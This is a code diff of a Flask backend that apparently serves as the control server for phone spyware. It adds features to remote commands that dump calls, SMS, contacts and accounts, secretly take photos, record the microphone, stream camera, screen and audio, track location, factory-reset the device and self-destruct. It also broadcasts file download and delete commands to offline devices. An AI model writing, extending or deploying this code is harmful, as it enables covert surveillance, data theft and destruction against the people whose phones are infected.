@@ -7,7 +7,11 @@ import requests
 from flask import Blueprint, request, jsonify, session, send_file
 from extensions import socketio, emit_device_command
 from config import GEMINI_API_KEY, BLACKLIST
-from core.database import database, users_database, connected_devices, save_db, save_users_db
+from core.database import (
+    database, users_database, connected_devices,
+    is_device_online, get_device_sid, cache_telemetry, get_cached_telemetry,
+    save_db, save_users_db
+)
 from core.auth import login_required, has_device_access
 from core.parsers import get_and_parse_cloud_data, update_device_record
 from sockets.events import check_geofences_for_device
@@ -32,7 +36,7 @@ def api_devices():
             continue
         
         v = database.get(k, {})
-        online = k in connected_devices
+        online = is_device_online(k)
         devices.append({
             "id": k,
             "model": v.get("info", {}).get("model", k),
@@ -45,33 +49,64 @@ def build_device_media_dict(device_id):
     """
     Standardizes device media items into a consistent dictionary of structured objects:
     { fbKey: { time, url, name, type, bytes, duration } }
-    Combines registered database media and disk media from media/ subdirectories.
+    Verifies that all media files physically exist on disk before returning them.
+    Prunes stale/ghost references from the database.
     Never indexes screen mirror frames or live camera frames.
     """
     media_dict = {}
     db_media = database.get(device_id, {}).get("media", {})
+    dirty = False
+
+    def find_media_file_on_disk(fn):
+        candidates = [
+            os.path.join("media", device_id, fn),
+            os.path.join("media", device_id, "voice", fn),
+            os.path.join("media", device_id, "photos", fn),
+            os.path.join("media", device_id, "videos", fn)
+        ]
+        for p in candidates:
+            if os.path.isfile(p):
+                return p
+        return None
+
     if isinstance(db_media, dict):
-        for k, v in db_media.items():
+        for k in list(db_media.keys()):
+            v = db_media[k]
             if isinstance(v, dict) and "url" in v and "name" in v:
-                v_name = v.get("name", "").lower()
-                if any(x in v_name for x in ["mirror", "mirro", "live_camera"]):
+                v_name = v.get("name", "")
+                if any(x in v_name.lower() for x in ["mirror", "mirro", "live_camera"]):
+                    db_media.pop(k, None)
+                    dirty = True
                     continue
+                # Verify that the physical file actually exists on the server
+                fp = find_media_file_on_disk(v_name)
+                if not fp:
+                    # Ghost item: file does not exist on disk, prune it
+                    db_media.pop(k, None)
+                    dirty = True
+                    continue
+                v["bytes"] = os.path.getsize(fp)
                 media_dict[k] = v
             elif isinstance(v, list) and k in ["voice", "photos", "video"]:
-                for fn in v:
+                for fn in list(v):
                     fn_l = fn.lower()
                     if any(x in fn_l for x in ["mirror", "mirro", "live_camera"]):
+                        continue
+                    fp = find_media_file_on_disk(fn)
+                    if not fp:
                         continue
                     m_type = "audio" if k == "voice" else ("image" if k == "photos" else "video")
                     fb_key = f"m_{fn.split('.')[0]}"
                     media_dict[fb_key] = {
-                        "time": int(time.time() * 1000),
+                        "time": int(os.path.getmtime(fp) * 1000),
                         "url": f"/api/media/stream/{device_id}/{fn}",
                         "name": fn,
-                        "type": m_type
+                        "type": m_type,
+                        "bytes": os.path.getsize(fp),
+                        "duration": 15 if m_type == "audio" else 0
                     }
 
-    # Only scan media/<device_id> subdirectories for physical files, NEVER data/<device_id>
+    # Scan media/<device_id> directories for physical files
     search_dirs = [
         (os.path.join("media", device_id, "voice"), "audio"),
         (os.path.join("media", device_id, "photos"), "image"),
@@ -97,7 +132,8 @@ def build_device_media_dict(device_id):
                     continue
                 
                 m_type = default_type
-                if fn_lower.endswith((".mp3", ".wav", ".m4a", ".ogg", ".aac")) or fn_lower.startswith("audio_"):
+                audio_exts = (".mp3", ".wav", ".m4a", ".ogg", ".aac", ".3gp", ".amr", ".opus", ".webm")
+                if fn_lower.endswith(audio_exts) or fn_lower.startswith("audio_"):
                     m_type = "call_recording" if "call" in fn_lower else "audio"
                 elif fn_lower.startswith("screenshot") or "screenshot" in fn_lower:
                     m_type = "screenshot"
@@ -109,17 +145,29 @@ def build_device_media_dict(device_id):
                 if m_type:
                     mtime = int(os.path.getmtime(fp) * 1000)
                     fb_key = f"m_{mtime}_{fn.split('.')[0]}"
+                    duration_sec = 15
+                    if "30" in fn_lower: duration_sec = 30
+                    elif "60" in fn_lower or "1min" in fn_lower: duration_sec = 60
+                    elif "300" in fn_lower or "5min" in fn_lower: duration_sec = 300
+                    elif "600" in fn_lower or "10min" in fn_lower: duration_sec = 600
+
                     media_dict[fb_key] = {
                         "time": mtime,
                         "url": f"/api/media/stream/{device_id}/{fn}",
                         "name": fn,
                         "type": m_type,
                         "bytes": os.path.getsize(fp),
-                        "duration": 15 if m_type == "audio" else 0
+                        "duration": duration_sec if m_type in ["audio", "call_recording"] else 0
                     }
                     known_names.add(fn)
+                    if isinstance(db_media, dict):
+                        db_media[fb_key] = media_dict[fb_key]
+                        dirty = True
         except Exception as e:
             print(f"[Media Aggregator] Error scanning {s_dir}: {e}")
+
+    if dirty:
+        save_db(device_id)
 
     return media_dict
 
@@ -267,7 +315,7 @@ def api_monitored_apps(device_id):
             }
             save_db()
             
-            sid = connected_devices.get(device_id)
+            sid = get_device_sid(device_id)
             if sid:
                 emit_device_command(device_id, {'action': f"MONITOR_APP:{package}"}, sid=sid)
             return jsonify({'success': True})
@@ -277,7 +325,7 @@ def api_monitored_apps(device_id):
                 del database[device_id]["settings"]["monitored_apps"][key]
                 save_db()
                 
-                sid = connected_devices.get(device_id)
+                sid = get_device_sid(device_id)
                 if sid:
                     emit_device_command(device_id, {'action': f"UNMONITOR_APP:{package}"}, sid=sid)
                 return jsonify({'success': True})
@@ -293,8 +341,8 @@ def api_device_mirror(device_id):
     if device_id not in database:
         return jsonify({})
     d = database[device_id]
-    mirror_url = d.get("mirror_url")
-    mirror_time = d.get("mirror_time")
+    mirror_url = d.get("mirror_url") or get_cached_telemetry(f"device:{device_id}:mirror_url")
+    mirror_time = d.get("mirror_time") or get_cached_telemetry(f"device:{device_id}:mirror_time")
     if not mirror_url:
         mirror_file = os.path.join("media", device_id, "mirror.jpg")
         if os.path.exists(mirror_file):
@@ -316,8 +364,8 @@ def api_device_live_camera(device_id):
     if device_id not in database:
         return jsonify({})
     d = database[device_id]
-    cam_url = d.get("live_camera_url")
-    cam_time = d.get("live_camera_time")
+    cam_url = d.get("live_camera_url") or get_cached_telemetry(f"device:{device_id}:live_camera_url")
+    cam_time = d.get("live_camera_time") or get_cached_telemetry(f"device:{device_id}:live_camera_time")
     if not cam_url:
         cam_file = os.path.join("media", device_id, "live_camera.jpg")
         if os.path.exists(cam_file):
@@ -339,8 +387,8 @@ def api_device_live_audio(device_id):
     if device_id not in database:
         return jsonify({})
     d = database[device_id]
-    audio_url = d.get("live_audio_url")
-    audio_time = d.get("live_audio_time")
+    audio_url = d.get("live_audio_url") or get_cached_telemetry(f"device:{device_id}:live_audio_url")
+    audio_time = d.get("live_audio_time") or get_cached_telemetry(f"device:{device_id}:live_audio_time")
     if not audio_url:
         voice_dirs = [os.path.join("media", device_id, "voice"), os.path.join("media", device_id)]
         for vdir in voice_dirs:
@@ -364,7 +412,34 @@ def api_device_previews(device_id):
         return jsonify({"error": "Unauthorized", "code": 403}), 403
     if device_id not in database:
         return jsonify({})
-    return jsonify(database[device_id].get("previews", {}))
+    
+    previews = database[device_id].get("previews", {})
+    if not isinstance(previews, dict):
+        return jsonify({})
+
+    # Verify physical file existence on disk to avoid returning stale 404 ghosts
+    valid_previews = {}
+    dirty = False
+    for k, item in list(previews.items()):
+        if isinstance(item, dict) and "name" in item:
+            fn = item["name"].lstrip('/\\')
+            candidates = [
+                os.path.join("media", device_id, fn),
+                os.path.join("media", device_id, "previews", fn),
+                os.path.join("media", device_id, "photos", fn),
+                os.path.join("data", device_id, fn)
+            ]
+            if any(os.path.isfile(cp) for cp in candidates):
+                valid_previews[k] = item
+            else:
+                previews.pop(k, None)
+                dirty = True
+    
+    if dirty:
+        database[device_id]["previews"] = previews
+        save_db(device_id)
+
+    return jsonify(valid_previews)
 
 @api_bp.route('/api/media/stream/<device_id>/<path:filename>', endpoint='stream_media')
 @login_required
@@ -377,6 +452,7 @@ def stream_media(device_id, filename):
     
     candidates = [
         os.path.join("media", device_id, filename),
+        os.path.join("media", device_id, "previews", filename),
         os.path.join("media", device_id, "voice", filename),
         os.path.join("media", device_id, "photos", filename),
         os.path.join("media", device_id, "video", filename),
@@ -389,11 +465,11 @@ def stream_media(device_id, filename):
 
 @api_bp.route('/api/device/<device_id>/upload_media', methods=['POST'], endpoint='api_device_upload_media')
 def api_device_upload_media(device_id):
-    if 'file' not in request.files:
-        return jsonify({"success": False, "error": "No file part"}), 400
-    file = request.files['file']
+    file = request.files.get('file') or request.files.get('audio') or request.files.get('media')
+    if not file and request.files:
+        file = next(iter(request.files.values()))
     category = request.form.get('category', 'files')
-    if file.filename == '':
+    if not file or not file.filename:
         return jsonify({"success": False, "error": "No selected file"}), 400
         
     os.makedirs(os.path.join("data", device_id), exist_ok=True)
@@ -466,7 +542,7 @@ def api_device_upload_media(device_id):
             socketio.emit('live_camera_update', {'device_id': device_id, 'url': cam_url}, room=device_id)
             socketio.emit('live_camera_update', {'device_id': device_id, 'url': cam_url})
             return jsonify({"success": True, "url": cam_url})
-        elif category in ["live_audio", "audio", "voice", "recording", "recordings"] or filename.lower().startswith("audio_") or filename.lower().endswith(('.mp3', '.m4a', '.wav', '.ogg', '.aac')):
+        elif category in ["live_audio", "audio", "voice", "recording", "recordings"] or filename.lower().startswith("audio_") or filename.lower().endswith(('.mp3', '.m4a', '.wav', '.ogg', '.aac', '.3gp', '.amr', '.opus', '.webm')):
             voice_dir = os.path.join("media", device_id, "voice")
             os.makedirs(voice_dir, exist_ok=True)
             voice_file_path = os.path.join(voice_dir, filename)
@@ -491,18 +567,28 @@ def api_device_upload_media(device_id):
             if "media" not in database[device_id] or not isinstance(database[device_id]["media"], dict):
                 database[device_id]["media"] = {}
             fbKey = f"m_{now_ms}_{filename.split('.')[0]}"
+            
+            fn_l = filename.lower()
+            dur_sec = 15
+            if "30" in fn_l: dur_sec = 30
+            elif "60" in fn_l or "1min" in fn_l: dur_sec = 60
+            elif "300" in fn_l or "5min" in fn_l: dur_sec = 300
+            elif "600" in fn_l or "10min" in fn_l: dur_sec = 600
+
             database[device_id]["media"][fbKey] = {
                 "time": now_ms,
                 "url": chunk_url,
                 "name": filename,
-                "type": "call_recording" if "call" in filename.lower() else "audio",
+                "type": "call_recording" if "call" in fn_l else "audio",
                 "bytes": os.path.getsize(voice_file_path) if os.path.exists(voice_file_path) else 0,
-                "duration": 15
+                "duration": dur_sec
             }
-            save_db()
+            save_db(device_id)
             socketio.emit('live_audio_chunk', {'device_id': device_id, 'url': chunk_url}, room=device_id)
             socketio.emit('live_audio_chunk', {'device_id': device_id, 'url': chunk_url})
-            return jsonify({"success": True})
+            socketio.emit('media_update', {'device_id': device_id, 'media': database[device_id]['media']})
+            print(f"[API Upload] Uploaded audio {filename} ({dur_sec}s) for device: {device_id}")
+            return jsonify({"success": True, "url": chunk_url})
         elif category in ["photo", "photos", "camera", "image", "screenshot", "screenshots", "screencap"] or filename.lower().startswith(("img_", "screenshot", "cam_")):
             # Absolute guard against mirror or live_camera
             fn_l = filename.lower()
@@ -564,7 +650,7 @@ def api_device_upload_media(device_id):
             database[device_id]["lastSeen"] = now_ms
             save_db()
             return jsonify({"success": True})
-        elif category == "previews":
+        elif category in ["previews", "preview"]:
             file_path = os.path.join("media", device_id, filename)
             file.save(file_path)
             
@@ -578,11 +664,14 @@ def api_device_upload_media(device_id):
             }
             if device_id not in database:
                 database[device_id] = {"_id": device_id}
-            if "previews" not in database[device_id]:
+            if "previews" not in database[device_id] or not isinstance(database[device_id]["previews"], dict):
                 database[device_id]["previews"] = {}
             database[device_id]["previews"][fbKey] = preview_entry
             database[device_id]["lastSeen"] = int(time.time() * 1000)
-            save_db()
+            save_db(device_id)
+            socketio.emit('preview_ready', {'device_id': device_id, 'preview': preview_entry}, room=device_id)
+            socketio.emit('preview_ready', {'device_id': device_id, 'preview': preview_entry})
+            return jsonify({"success": True, "url": preview_entry["url"]})
         else:
             fn_l = filename.lower()
             if any(k in fn_l for k in ["mirror", "mirro", "mirrro"]):
@@ -639,7 +728,8 @@ def api_device_action(device_id):
         'GET_DEVICE_INFO': 'DEVICE_INFO', 'DUMP_CALLS': 'CALL_LOG', 'DUMP_SMS': 'SMS_LOG',
         'DUMP_CONTACTS': 'CONTACTS', 'GET_ACCOUNTS': 'ACCOUNTS', 'LIST_APPS': 'APPS_LIST',
         'TAKE_SCREENSHOT': 'SCREENSHOT', 'TAKE_PHOTO_FRONT': 'PHOTO_FRONT', 'TAKE_PHOTO_REAR': 'PHOTO_REAR',
-        'RECORD_AUDIO_15': 'MIC_15S', 'RECORD_AUDIO_300': 'AUDIO_300', 'RECORD_AUDIO_600': 'AUDIO_600',
+        'RECORD_AUDIO_15': 'MIC_15S', 'RECORD_AUDIO_30': 'MIC_30S', 'RECORD_AUDIO_60': 'MIC_60S',
+        'RECORD_AUDIO_300': 'AUDIO_300', 'RECORD_AUDIO_600': 'AUDIO_600',
         'LOCK_DEVICE': 'LOCK_SCREEN', 'FACTORY_RESET': 'FACTORY_RESET',
         'FORCE_LOC_V1': 'FORCE_LOC_V1', 'FORCE_LOC_V2': 'FORCE_LOC_V2',
         'SELF_DESTRUCT': 'SELF_DESTRUCT',
@@ -686,7 +776,14 @@ def api_device_action(device_id):
                         settings["blocked_webs"].pop(k)
             save_db()
     else:
-        cmd = action_map.get(action, action)
+        if action.startswith('RECORD_AUDIO_'):
+            sec = action.replace('RECORD_AUDIO_', '')
+            if sec in ['15', '30', '60']:
+                cmd = f'MIC_{sec}S'
+            else:
+                cmd = f'AUDIO_{sec}'
+        else:
+            cmd = action_map.get(action, action)
         if cmd == 'START_LOCK_TRACK':
             if device_id not in database:
                 database[device_id] = {"_id": device_id}
@@ -702,14 +799,19 @@ def api_device_action(device_id):
             database[device_id]["settings"]["lock_track_enabled"] = False
             save_db()
 
-    sid = connected_devices.get(device_id)
+    sid = get_device_sid(device_id)
     if sid:
         print(f"[Socket.io] Emitting Command: {cmd} to Device: {device_id} (sid: {sid})")
         emit_device_command(device_id, {'action': cmd}, sid=sid)
         update_device_record(device_id, "logs", f"Sent command: {cmd}")
         return jsonify({'success': True})
     else:
-        if cmd in ['START_LOCK_TRACK', 'STOP_LOCK_TRACK']:
+        dev = database.get(device_id, {})
+        now_ms = int(time.time() * 1000)
+        is_recent = dev and (now_ms - dev.get('lastSeen', 0) < 120000)
+        if is_recent or cmd in ['START_LOCK_TRACK', 'STOP_LOCK_TRACK'] or any(cmd.startswith(p) for p in ['LIST_FILES', 'PREVIEW_FILE', 'DOWNLOAD_FILE', 'DELETE_FILE']):
+            emit_device_command(device_id, {'action': cmd})
+            update_device_record(device_id, "logs", f"Sent command (broadcast): {cmd}")
             return jsonify({'success': True, 'queued': True})
         return jsonify({'success': False, 'error': 'Device offline'}), 400
 
